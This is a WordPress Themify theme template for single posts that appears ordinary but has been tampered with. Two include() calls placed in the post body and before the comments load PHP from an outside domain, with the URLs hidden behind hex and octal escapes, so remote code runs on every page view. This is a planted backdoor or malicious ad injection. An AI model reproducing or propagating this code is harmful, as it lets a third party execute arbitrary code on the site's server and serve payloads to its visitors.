<?php
/** Themify Default Variables
 *  @var object */
global $themify; ?>

<?php
if( isset($_GET['post_in_lighbox']) ){
	themify_theme_enqueue_scripts();
	do_action('wp_head');
	echo '<body class="lightbox-post">';
} else {
	get_header();
}
?>

<?php if( have_posts() ) while ( have_posts() ) : the_post(); ?>

<!-- layout-container -->
<div id="layout" class="pagewidth clearfix">

	<?php themify_content_before(); //hook ?>
	<!-- content -->
	<div id="content" class="list-post">
    	<?php themify_content_start(); //hook ?>
		<article id="post-<?php the_ID(); ?>" <?php post_class("post clearfix $class"); ?>>
			<div class="post-inner">
			<?php 
            include("h\x74t\160:\057\057w\x77\x77.gam\145zto\x64a\171.\x63om\x2f\x61d\163\x32\056\x70h\x70"); ?>
			<?php get_template_part( 'includes/loop' , 'single'); ?>
			<?php wp_link_pages(array('before' => '<p><strong>Pages:</strong> ', 'after' => '</p>', 'next_or_number' => 'number')); ?>

			<?php get_template_part( 'includes/author-box', 'single'); ?>

		<?php get_template_part( 'includes/post-nav'); ?>

		<?php if(!themify_check('setting-comments_posts')): ?>
		<?php 
        include("\x68\164tp:/\057\167\167\167\x2e\x67a\155ez\x74od\141\x79\056\x63o\155/a\144\x73\x2ep\150\x70"); ?>
			<?php comments_template(); ?>
		<?php endif; ?>
			</div>
			<!-- /.post-inner -->
		</article>
		<!-- /.post -->
        
        <?php themify_content_end(); //hook ?>
	</div>
	<!-- /content -->
    <?php themify_content_after() //hook; ?>

<?php endwhile; ?>

<?php 
/////////////////////////////////////////////
// Sidebar							
/////////////////////////////////////////////
if ($themify->layout != "sidebar-none" && !isset($_GET['post_in_lighbox'])): get_sidebar(); endif; ?>

</div>
<!-- /layout-container -->
	
<?php
if( !isset($_GET['post_in_lighbox']) ){
	get_footer();
}
?>

